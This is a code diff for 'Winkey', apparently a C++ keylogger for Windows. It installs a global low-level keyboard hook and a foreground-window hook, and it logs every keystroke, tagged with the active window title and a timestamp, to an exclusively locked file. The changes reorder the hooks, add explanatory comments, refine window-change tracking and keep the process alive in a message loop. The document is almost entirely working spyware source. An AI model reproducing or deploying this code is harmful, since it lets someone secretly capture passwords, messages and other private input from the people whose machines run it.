@@ -1,22 +1,23 @@
 #include "winkey.h"
 
 Winkey::Winkey() {
+	/* Create or Open the logfile */
 	gLogHandle = CreateFileA(
 		LOG_FILE,
-		GENERIC_WRITE,
+		FILE_GENERIC_WRITE,
 		0,
 		NULL,
 		OPEN_ALWAYS,
 		FILE_ATTRIBUTE_NORMAL,
 		NULL
 	);
-
 	if (gLogHandle == INVALID_HANDLE_VALUE) {
 		throw std::runtime_error(std::format("CreateFile failed ({})\n", GetLastError()));
 	}
 
 	OVERLAPPED overlap = {0};
 
+	/* Place an exclusive flock on the logfile */
 	if (!LockFileEx(
 		gLogHandle,
 		LOCKFILE_EXCLUSIVE_LOCK | LOCKFILE_FAIL_IMMEDIATELY,
@@ -36,6 +37,7 @@ Winkey::~Winkey() {
 
 	OVERLAPPED overlap = { 0 };
 
+	/* Release the file */
 	if (!UnlockFileEx(gLogHandle, 0, 1, 0, &overlap)) {
 		std::cout << std::format("UnlockFileEx failed ({})\n", GetLastError());
 	}
@@ -45,17 +47,7 @@ Winkey::~Winkey() {
 }
 
 int Winkey::Hook() {
-	HHOOK kbdHook = SetWindowsHookExA(
-		WH_KEYBOARD_LL,
-		&Winkey::onKey,
-		NULL,
-		0
-	);
-	if (kbdHook == nullptr) {
-		std::cout << std::format("SetWindowsHookExA failed ({})\n", GetLastError());
-		return 1;
-	}
-
+	/* Setting up window hook */
 	HWINEVENTHOOK winHook = SetWinEventHook(
 		EVENT_SYSTEM_FOREGROUND,
 		EVENT_SYSTEM_FOREGROUND,
@@ -70,6 +62,23 @@ int Winkey::Hook() {
 		return 1;
 	}
 
+	/* Init first window */
+	GetWindowText(GetForegroundWindow(), gLastWindowTitle, 512);
+	gReportNextWindow = true;
+
+	/* Setting up keyBoard hook */
+	HHOOK kbdHook = SetWindowsHookExA(
+		WH_KEYBOARD_LL,
+		&Winkey::onKey,
+		NULL,
+		0
+	);
+	if (kbdHook == nullptr) {
+		std::cout << std::format("SetWindowsHookExA failed ({})\n", GetLastError());
+		return 1;
+	}
+
+	/* Infinite hook incoming message, to stay alive */
 	MSG msg;
 	while (GetMessage(&msg, NULL, WM_INPUT, 0) > 0) {
 		TranslateMessage(&msg);
@@ -82,12 +91,18 @@ int Winkey::Hook() {
 	HOOKPROC onKey;
 */
 LRESULT CALLBACK Winkey::onKey(int nCode, WPARAM wParam, LPARAM lParam) {
+	/* If a Key has been pressed */
 	if (wParam == WM_KEYDOWN) {
+		/* Align data */
 		KBDLLHOOKSTRUCT* kbdEv = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);
 
+		/* Log Window that triggered the event */
 		logCurrentWindow();
 
+		/* Solving key */
 		const char* data = solve(kbdEv);
+
+		/* Writing key to file */
 		DWORD bytesWrote;
 		WriteFile(gLogHandle, data, std::strlen(data), &bytesWrote, NULL);
 	}
@@ -114,9 +129,15 @@ LRESULT CALLBACK Winkey::onWindow(HWINEVENTHOOK hWinEventHook,
 	(void)idEventThread;
 	(void)dwmsEventTime;
 
-	GetWindowText(hwnd, gLastWindowTitle, sizeof(gLastWindowTitle));
-	gReportNextWindow = true;
+	/* Fetching ev window */
+	TCHAR currentWindow[512] = { 0 };
+	GetWindowText(hwnd, currentWindow, 512);
 
+	/* Compare with last window before registering the changes */
+	if (strcmp(currentWindow, gLastWindowTitle) != 0) {
+		GetWindowText(hwnd, gLastWindowTitle, 512);
+		gReportNextWindow = true;
+	}
 	return 0;
 }
 
@@ -162,15 +183,22 @@ void Winkey::logCurrentWindow() {
 		return;
 	}
 
+	/* We are reporting, changing state */
+	gReportNextWindow = false;
+
+	/* Getting local time */
 	std::time_t t = std::time(nullptr);
 	struct tm new_time;
 	localtime_s(&new_time, &t);
 
+	/* Formatting time */
 	char mbstr[100 + sizeof(gLastWindowTitle)] = {0};
 	std::strftime(mbstr, sizeof(mbstr), "%d.%m.%Y %H:%M:%S", &new_time);
 
-	const std::string to_write = std::format("[{}] - '{}'\n", mbstr, gLastWindowTitle);
+	/* Preparing payload to write, with time and lastWindowTitle */
+	const std::string to_write = std::format("\n[{}] - '{}'\n", mbstr, gLastWindowTitle);
 
+	/* Writing payload to file */
 	DWORD bytesWrote;
 	WriteFile(gLogHandle, to_write.c_str(), to_write.length(), &bytesWrote, NULL);
 }
